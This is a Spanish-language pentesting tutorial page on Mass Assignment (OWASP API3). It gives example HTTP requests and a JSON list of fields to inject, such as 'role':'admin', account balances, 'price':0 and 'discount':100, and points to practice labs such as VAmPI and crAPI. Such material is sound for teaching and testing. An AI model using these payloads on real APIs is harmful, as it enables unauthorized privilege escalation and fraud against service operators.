# Mass Assignment (API3)

**Mass Assignment** ocurre cuando una API vincula automáticamente los campos del JSON que envías a las propiedades de un objeto interno, **sin filtrar cuáles tienes permitido modificar**. Si envías un campo extra que no deberías controlar (como `role` o `isAdmin`), el servidor lo asigna igualmente.

Es un caso de **API3 — Broken Object Property Level Authorization**.

---

## Cómo se ve

El formulario de registro solo te deja poner usuario y contraseña:

```http
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{"username":"diego","password":"Test1234!"}
```

Pero el modelo interno `User` también tiene un campo `role`. Pruebas a enviarlo:

```http
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{"username":"diego","password":"Test1234!","role":"admin"}
```

Si la cuenta se crea **como admin** → Mass Assignment. El backend hizo algo como `User(**request.json)` sin lista blanca de campos.

---

## Campos típicos que probar

Añade estos campos a peticiones de registro, actualización de perfil o creación de recursos:

```json
{
  "role": "admin",
  "isAdmin": true,
  "is_admin": true,
  "admin": true,
  "verified": true,
  "email_verified": true,
  "account_balance": 999999,
  "credit": 999999,
  "id": 1,
  "user_id": 1,
  "group": "administrators",
  "permissions": ["*"],
  "status": "active",
  "approved": true
}
```

---

## Cómo descubrir qué campos existen

No pruebes a ciegas; averigua primero los nombres reales de las propiedades:

1. **Mira las respuestas GET** del mismo objeto. Si `GET /api/users/me` devuelve `"role":"user"`, entonces `role` es un campo válido que intentar en el `PUT`/`POST`.
2. **Documentación** (Swagger/OpenAPI) → el modelo de datos lista todos los campos.
3. **Mensajes de error** verbosos que mencionan campos.
4. **Otras versiones** de la API que expongan más campos.

> **Regla práctica:** todo campo que la API te **devuelve** en una respuesta es candidato a que puedas **enviarlo** en una petición de escritura.

---

## Dónde buscarlo

- **Registro de usuarios** → escalar a admin.
- **Actualización de perfil** (`PUT /api/users/me`) → cambiarte el rol o el saldo.
- **Creación de pedidos/pagos** → fijar precio, descuento o estado "pagado".
- **Flujos de aprobación** → marcarte como "aprobado"/"verificado".

---

## Impacto

Escalada de privilegios (user → admin), fraude (modificar precios/saldos), saltarse verificaciones. Suele ser un camino directo al control total de la cuenta o de la aplicación.

---

> **Consejo:** este fallo se combina genial con la lógica de negocio. En una tienda, prueba a añadir `"price":0` o `"discount":100` al crear un pedido. En DockerLabs/APIs vulnerables, el campo `role` en el registro o en la actualización de perfil es un clásico que lleva directo a admin.

---

## Dónde practicar el Mass Assignment

| Lab | Qué probar | Enlace |
| --- | ---------- | ------ |
| [VAmPI](./Laboratorios/VAmPI.md) | Registrarte enviando `"admin":true` | https://github.com/erev0s/VAmPI |
| [OWASP crAPI](./Laboratorios/OWASP%20crAPI.md) | Campos extra en pedidos/cupones | https://github.com/OWASP/crAPI |

```flow
Observar :: Mirar qué campos devuelve un GET del objeto (role, admin...).
Enviar :: Añadir esos campos a un POST/PUT de registro o actualización.
Confirmar :: Comprobar si el servidor los aceptó (p.ej. te hiciste admin).
```

> **Consejo:** regla de oro — todo campo que la API te **devuelve** es candidato a que puedas **enviarlo**. En VAmPI, `"admin":true` en el registro es el clásico.
